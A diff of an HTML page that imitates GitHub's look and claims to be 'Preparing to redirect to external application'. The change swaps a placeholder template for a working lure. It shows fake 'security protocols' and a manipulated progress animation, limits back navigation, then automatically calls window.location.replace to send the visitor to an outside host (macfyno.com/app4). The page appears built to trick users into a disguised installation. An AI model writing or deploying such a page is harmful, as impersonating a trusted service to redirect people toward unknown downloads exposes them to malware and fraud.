@@ -1,240 +1,205 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub - External Application Redirect</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-        }
-        
-        body {
-            background-color: #0d1117;
-            color: #c9d1d9;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background-color: #161b22;
-            border-radius: 12px;
-            border: 1px solid #30363d;
-            max-width: 600px;
-            width: 100%;
-            padding: 40px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
-        }
-        
-        .header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 30px;
-        }
-        
-        .github-logo {
-            font-size: 28px;
-            font-weight: bold;
-            background: linear-gradient(90deg, #f0f6fc, #8b949e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
-            color: #f0f6fc;
-            margin-bottom: 8px;
-        }
-        
-        .subtitle {
-            color: #8b949e;
-            font-size: 16px;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #30363d;
-        }
-        
-        .progress-container {
-            margin: 30px 0;
-        }
-        
-        .progress-label {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #8b949e;
-        }
-        
-        .progress-bar {
-            height: 8px;
-            background-color: #21262d;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 20px;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            width: 10%;
-            background: linear-gradient(90deg, #1f6feb, #2ea043);
-            border-radius: 4px;
-            animation: progressAnimation 2s ease-in-out forwards;
-        }
-        
-        @keyframes progressAnimation {
-            0% { width: 10%; }
-            100% { width: 100%; }
-        }
-        
-        .status-list {
-            list-style: none;
-            margin: 25px 0 35px;
-        }
-        
-        .status-item {
-            display: flex;
-            align-items: center;
-            padding: 12px 0;
-            border-bottom: 1px solid #21262d;
-            font-size: 15px;
-        }
-        
-        .status-item:last-child {
-            border-bottom: none;
-        }
-        
-        .status-icon {
-            margin-right: 12px;
-            color: #2ea043;
-        }
-        
-        .status-details {
-            flex-grow: 1;
-        }
-        
-        .status-text {
-            color: #c9d1d9;
-        }
-        
-        .status-arrow {
-            color: #484f58;
-        }
-        
-        .redirect-message {
-            background-color: #0d1117;
-            border-radius: 6px;
-            padding: 16px;
-            text-align: center;
-            border: 1px solid #30363d;
-            margin-top: 25px;
-            font-size: 14px;
-            color: #8b949e;
-        }
-        
-        .redirect-message strong {
-            color: #f0f6fc;
-        }
-        
-        .countdown {
-            color: #2ea043;
-            font-weight: bold;
-        }
-        
-        @media (max-width: 640px) {
-            .container {
-                padding: 25px;
-            }
-            
-            h1 {
-                font-size: 20px;
-            }
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Preparing redirect…</title>
+<style>
+  /* ===== GLOBAL ===== */
+  body {
+    margin: 0;
+    background: #0d1117;
+    font-family: system-ui, sans-serif;
+    color: #c9d1d9;
+    text-align: center;
+    padding: 80px 20px;
+  }
+
+  .wrapper {
+    display: inline-block;
+    text-align: center;
+  }
+
+  h1 {
+    font-size: 2.5em;
+    margin-bottom: 10px;
+  }
+
+  .subtitle {
+    font-size: 1.2em;
+    margin-bottom: 40px;
+    color: #8b949e;
+  }
+
+  .card {
+    background: #161b22;
+    border-radius: 16px;
+    padding: 40px;
+    max-width: 480px;
+    margin: 0 auto 40px;
+  }
+
+  .progress {
+    display: flex;
+    justify-content: space-between;
+    font-size: 16px;
+  }
+
+  .bar {
+    background: #21262d;
+    height: 12px;
+    border-radius: 6px;
+    margin: 15px 0 30px;
+    overflow: hidden;
+  }
+
+  .bar-fill {
+    background: #2ea043;
+    width: 19%;
+    height: 100%;
+    transition: width 0.5s;
+  }
+
+  .status {
+    font-size: 16px;
+    margin-bottom: 30px;
+  }
+
+  .dot {
+    display: inline-block;
+    width: 12px;
+    height: 12px;
+    background: #2ea043;
+    border-radius: 50%;
+    margin-right: 8px;
+    animation: blink 1.2s infinite;
+  }
+
+  @keyframes blink {
+    50% { opacity: 0.3; }
+  }
+
+  .branch {
+    background: #238636;
+    border: none;
+    color: white;
+    padding: 10px 18px;
+    border-radius: 8px;
+    font-size: 16px;
+    cursor: pointer;
+    margin-bottom: 30px;
+  }
+
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(10, 18px);
+    gap: 8px;
+    justify-content: center;
+  }
+
+  .cell {
+    width: 18px;
+    height: 18px;
+    background: #21262d;
+    border-radius: 4px;
+  }
+
+  .cell.active {
+    background: #2ea043;
+  }
+
+  .footer {
+    color: #8b949e;
+    font-size: 1em;
+  }
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="github-logo">GitHub</div>
-        </div>
-        
-        <h1>Preparing to redirect to external application</h1>
-        
-        <div class="subtitle">
-            You will be redirected to the installation page shortly
-        </div>
-        
-        <div class="progress-container">
-            <div class="progress-label">
-                <span>Processing request</span>
-                <span id="progress-percent">10%</span>
-            </div>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
-        </div>
-        
-        <ul class="status-list">
-            <li class="status-item">
-                <div class="status-icon">✓</div>
-                <div class="status-details">
-                    <div class="status-text">Initializing security protocols</div>
-                </div>
-                <div class="status-arrow">main → external-app</div>
-            </li>
-        </ul>
-        
-        <div class="redirect-message">
-            Redirecting to external application in <span id="countdown" class="countdown">5</span> seconds...
-        </div>
+<div class="wrapper">
+  <h1>GitHub</h1>
+  <p class="subtitle">Preparing to redirect to external application</p>
+
+  <div class="card">
+    <div class="progress">
+      <span>Processing request</span>
+      <span id="percent">19%</span>
     </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const progressPercent = document.getElementById('progress-percent');
-            const countdownElement = document.getElementById('countdown');
-            let countdown = 5;
-            let progress = 10;
-            
-            // Обновляем прогресс-бар
-            const progressInterval = setInterval(() => {
-                if (progress < 100) {
-                    progress += 5;
-                    progressPercent.textContent = progress + '%';
-                }
-            }, 200);
-            
-            // Обратный отсчет
-            const countdownInterval = setInterval(() => {
-                countdown--;
-                countdownElement.textContent = countdown;
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    clearInterval(progressInterval);
-                    redirectToExternalApp();
-                }
-            }, 1000);
-            
-            function redirectToExternalApp() {
-                // Замените этот URL на ваш целевой URL
-                const externalAppUrl = 'https://example.com/installation';
-                
-                // Перенаправление на внешнее приложение
-                window.location.href = externalAppUrl;
-            }
-            
-            // Также позволяем пользователю нажать на сообщение для немедленного перехода
-            document.querySelector('.redirect-message').addEventListener('click', redirectToExternalApp);
-        });
-    </script>
+    <div class="bar">
+      <div class="bar-fill" id="bar"></div>
+    </div>
+
+    <div class="status">
+      <span class="dot"></span>
+      Initializing security protocols
+    </div>
+
+    <button class="branch">main → external-app</button>
+
+    <div class="grid" id="grid"></div>
+  </div>
+
+  <p class="footer">You will be redirected shortly</p>
+</div>
+
+<script>
+  history.replaceState(null, "", location.href);
+
+  const grid = document.getElementById("grid");
+  const bar = document.getElementById("bar");
+  const percent = document.getElementById("percent");
+
+  // ===== GRID =====
+  for (let i = 0; i < 70; i++) {
+    const cell = document.createElement("div");
+    cell.className = "cell";
+    grid.appendChild(cell);
+  }
+
+  setInterval(() => {
+    document.querySelectorAll(".cell").forEach(c => {
+      c.classList.toggle("active", Math.random() > 0.85);
+    });
+  }, 500);
+
+  // ===== PROGRESS =====
+  let p = 19;
+
+  function animateProgress() {
+    let speed;
+
+    if (p < 10) {
+      speed = 0.25;
+    } else if (p < 55) {
+      speed = 0.9;
+    } else if (p < 80) {
+      speed = 0.18;
+    } else if (p < 92) {
+      speed = 1.4;
+    } else {
+      speed = 0.35;
+    }
+
+    p += speed;
+
+    if (p >= 100) {
+      p = 100;
+      bar.style.width = "100%";
+      percent.textContent = "100%";
+
+      setTimeout(() => {
+        window.location.replace("https://macfyno.com/app4");
+      }, 400);
+
+      return;
+    }
+
+    bar.style.width = p + "%";
+    percent.textContent = Math.floor(p) + "%";
+
+    requestAnimationFrame(animateProgress);
+  }
+
+  requestAnimationFrame(animateProgress);
+</script>
 </body>
 </html>
